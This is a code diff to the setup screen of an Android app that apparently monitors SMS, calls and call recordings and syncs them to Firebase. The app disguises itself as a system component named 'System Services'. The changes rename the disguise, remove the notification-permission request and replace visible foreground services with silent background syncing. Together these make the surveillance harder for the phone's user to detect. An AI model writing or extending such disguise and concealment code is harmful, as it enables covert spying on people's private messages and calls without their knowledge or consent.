@@ -60,9 +60,6 @@ class SetupWizardActivity : AppCompatActivity() {
                 Manifest.permission.RECEIVE_SMS,
                 Manifest.permission.READ_SMS
             )
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                list.add(Manifest.permission.POST_NOTIFICATIONS)
-            }
             return list.toTypedArray()
         }
     }
@@ -104,7 +101,7 @@ class SetupWizardActivity : AppCompatActivity() {
             try {
                 val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                 startActivity(intent)
-                Toast.makeText(this, "Enable 'System Toolkit'", Toast.LENGTH_LONG).show()
+                Toast.makeText(this, "Enable 'System Services'", Toast.LENGTH_LONG).show()
             } catch (e: Exception) {
                 Toast.makeText(this, "Please open Settings > Accessibility", Toast.LENGTH_SHORT).show()
             }
@@ -115,7 +112,7 @@ class SetupWizardActivity : AppCompatActivity() {
             try {
                 val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                 startActivity(intent)
-                Toast.makeText(this, "Enable notification access for 'System Toolkit'", Toast.LENGTH_LONG).show()
+                Toast.makeText(this, "Enable notification access for 'System Services'", Toast.LENGTH_LONG).show()
             } catch (e: Exception) {
                 Toast.makeText(this, "Please open Settings > Notification Access", Toast.LENGTH_SHORT).show()
             }
@@ -161,7 +158,7 @@ class SetupWizardActivity : AppCompatActivity() {
             try {
                 val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
                 startActivity(intent)
-                Toast.makeText(this, "Enable Usage Access for 'System Toolkit'", Toast.LENGTH_LONG).show()
+                Toast.makeText(this, "Enable Usage Access for 'System Services'", Toast.LENGTH_LONG).show()
             } catch (e: Exception) {
                 Toast.makeText(this, "Please open Settings > Usage Access", Toast.LENGTH_SHORT).show()
             }
@@ -202,28 +199,23 @@ class SetupWizardActivity : AppCompatActivity() {
             prefs.parentPin = code
             prefs.isConfigured = true
 
-            // Lock in System Toolkit disguise as default
+            // Lock in System Services disguise as default
             DisguiseManager.applyDisguise(this, DisguiseProfile.SIM_TOOLKIT)
 
             // Initial Device Status sync to Firebase Cloud
             FirebaseSyncManager.getInstance(this).syncDeviceStatus(
                 batteryLevel = 90,
                 isOnline = true,
-                disguise = "System Toolkit",
+                disguise = "System Services",
                 location = "Protected • Active"
             )
 
-            // Start background monitoring services
+            // Event-driven & WorkManager background sync (0% continuous battery drain & 0 background notifications)
             try {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    startForegroundService(Intent(this, CallRecordingSyncService::class.java))
-                    startForegroundService(Intent(this, SmsObserverService::class.java))
-                } else {
-                    startService(Intent(this, CallRecordingSyncService::class.java))
-                    startService(Intent(this, SmsObserverService::class.java))
-                }
+                CallRecordingSyncService.syncCallsAndRecordings(this)
+                NetworkSyncManager.getInstance(this).scheduleOfflineSyncWorker()
             } catch (e: Exception) {
-                // Background service launch caught safely
+                // Background sync scheduled safely
             }
 
             Toast.makeText(this, "Setup complete! Device protected.", Toast.LENGTH_SHORT).show()
